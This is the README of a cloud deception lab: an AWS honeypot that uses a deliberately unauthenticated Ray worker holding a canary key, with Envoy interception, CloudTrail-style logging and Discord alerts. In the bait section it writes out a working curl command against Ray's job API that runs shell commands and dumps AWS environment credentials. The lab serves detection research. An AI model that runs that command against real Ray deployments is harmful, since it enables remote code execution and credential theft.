# floci-cloud-deception-lab

AWS honeypot built on [floci](https://floci.io/aws/). A canary AWS
credential sits in the decoy's environment; any real AWS SDK/CLI call
made with it — no `--endpoint-url` override needed — gets transparently
redirected to floci instead of AWS. Every call is logged CloudTrail-style,
queryable via LogQL, and posted to Discord in real time.

**Status: live** at `https://ml-compute-01.tail6c68d0.ts.net`.

## Architecture

```
                    attacker (internet)
                            │
                            ▼
                 Tailscale Funnel (public HTTPS)
                            │
╔════════════════════════════════════════════════════════════╗
║ cluster: timbernetes                                       ║
║                                                            ║
║ pod: floci-deception (one pod, one netns, all 4            ║
║ containers below share it)                                 ║
║                                                            ║
║   ml-worker (Ray)                                          ║
║     no auth, runs a shell command as a "job",              ║
║     has the canary AWS key in its environment              ║
║         │  boto3 call, no --endpoint-url                   ║
║         ▼                                                  ║
║   envoy-sidecar + Lua filter                               ║
║     iptables redirects tcp/443 here; decrypts              ║
║     TLS, works out the AWS action, builds a                ║
║     CloudTrail-shaped log line                             ║
║         │                                                  ║
║         ▼                                                  ║
║   floci                                                    ║
║     fake AWS — answers the call                            ║
║                                                            ║
║   promtail                                                 ║
║     ships the log out of the pod                           ║
║                                                            ║
║   (everything else blocked — default-deny egress,          ║
║    only this path + DNS allowed out)                       ║
╚════════════════════════════════════════════════════════════╝
                            │
                            ▼
                          Loki
                    (log_type=cloudtrail)
                            │
                            ▼
                  discord-alert-tailer
         one embed per event, colors by severity
                            │
                            ▼
                      Discord channel
```

## The bait

`ml-worker` runs `rayproject/ray:2.9.0-py311`, vulnerable to the
"ShadowRay"-class issue (CVE-2025-62593 / CVE-2023-48022): Ray's
dashboard API has no authentication by design.

```sh
curl -X POST http://<target>:8265/api/jobs/ \
  -H 'Content-Type: application/json' \
  -d '{"entrypoint": "id; env | grep AWS_", "runtime_env": {}}'
```

Verified end to end: exploit reads the canary credential from the
environment, calls `boto3.client("sts")`/`iam` with zero endpoint
override, response comes back with `"server": "envoy"` — proof it hit
our interception stack, not real AWS.

## Layout

```
shared/      -> the actual security logic: Envoy config, iptables redirect
                script, fake IAM policy doc, cert/canary generation. Both
                deployments below read these files directly -- neither
                keeps its own copy.
manifests/   -> Kubernetes deployment
├── honeypot/  -> "timbernetes" (Ray, floci, envoy, iptables redirect, network lockdown)
└── alerting/  -> management cluster (tails Loki, posts to Discord — not in the honeypot pod)
compose/     -> Docker Compose deployment, single droplet instead of a
                cluster -- see compose/README.md for what's different
                and why
```

`timbernetes` is a general-purpose Cluster API cluster (also runs
`flux-system`/`fluent-bit`), not a dedicated honeypot cluster. Its
isolation (Cilium default-deny egress, non-root, no ServiceAccount
token) is scoped to the `floci-deception` namespace only — anything
else added to this cluster needs its own equivalent hardening.

## Deploy

**Honeypot (timbernetes):**

```sh
kubectl config use-context <timbernetes-context>
./scripts/generate-tls-secrets.sh --apply
./scripts/generate-canary-secret.sh --apply
kubectl apply -f manifests/honeypot/
```

Ray takes ~60-100s to start. Check: `kubectl -n floci-deception get pods`.

**Alerting (management cluster):**

```sh
kubectl config use-context <management-cluster-context>
./scripts/set-discord-webhook.sh 'https://discord.com/api/webhooks/...'
kubectl apply -f manifests/alerting/
```

One Discord embed per event, posted as it happens, colored by severity
(red = privesc/persistence/destructive, orange = mutation, grey =
recon). A small `requestID` dedup guard drops exact repeats.

## Public exposure (Tailscale Funnel)

Requires the Tailscale Operator installed in `timbernetes`
(`manifests/honeypot/tailscale-operator/install.sh`), plus in your
tailnet's ACL: HTTPS Certificates enabled, and Funnel granted to
whatever tag the OAuth client provisions with (`tag:k8s-operator` here).

```sh
export OAUTH_CLIENT_ID=... OAUTH_CLIENT_SECRET=...   # reuse an existing operator's, or generate fresh
cd manifests/honeypot/tailscale-operator && ./install.sh
kubectl apply -f ../06-ray-dashboard-service.yaml -f ../07-ray-funnel-ingress.yaml
```

Two things that'll trip you up if reproducing this:
- The chart's `proxyConfig.defaultTags` defaults to `tag:k8s`, not
  `tag:k8s-operator` — already fixed in `install.sh`, but if the
  Ingress never gets an `ADDRESS` and the operator logs
  `requested tags [tag:k8s] are invalid`, that's why.
- A brand-new hostname can `NXDOMAIN` for ~1 minute after the proxy pod
  goes `Running` before DNS catches up. Normal, not broken.

## Secrets — nothing committed

| Secret | Script |
|---|---|
| TLS interception keys | `scripts/generate-tls-secrets.sh --apply` |
| Canary AWS credential | `scripts/generate-canary-secret.sh --apply` |
| Discord webhook URL | `scripts/set-discord-webhook.sh <url>` |

Run any of them any time to rotate.

## Scope

**This only sees activity from *inside* the `ml-worker` netns** — an
attacker who gets RCE into the pod and runs AWS calls from that shell.
It does **not** catch a key leaked publicly (GitHub, Slack, etc.) and
used from the attacker's own network — that traffic never touches this
pod. For that broader case, use a real AWS account with GuardDuty/
CloudTrail, or [canarytokens.org](https://canarytokens.org).

## CloudTrail-shaped logging

Built in an Envoy Lua filter, not floci itself (floci's own
`CloudTrailLogWriter`/`lookup-events` is non-functional — tested,
always returns empty). Covers all three AWS protocol shapes: query
(STS/IAM/EC2), JSON (DynamoDB/Lambda), and REST (S3, inferred from
method + bucket/key + subresource params like `?acl`).

Shipped to the cluster's existing Loki, tagged `log_type=cloudtrail`:

```logql
{log_type="cloudtrail"} | json | eventName="CreateUser"
```

## Fake instance metadata (IMDS)

A second Envoy listener binds `169.254.169.254:80` inside the pod and
answers the EC2 instance metadata endpoints directly (Lua `respond()`,
no upstream) — same canary key as `iam/security-credentials/<role>`.
Automated cloud-recon tools (Pacu, ScoutSuite, linPEAS) probe IMDS on
their own regardless of what's already visible in the environment;
this gives them the credential too. Logged through the same pipeline,
`eventSource: imds.internal`.
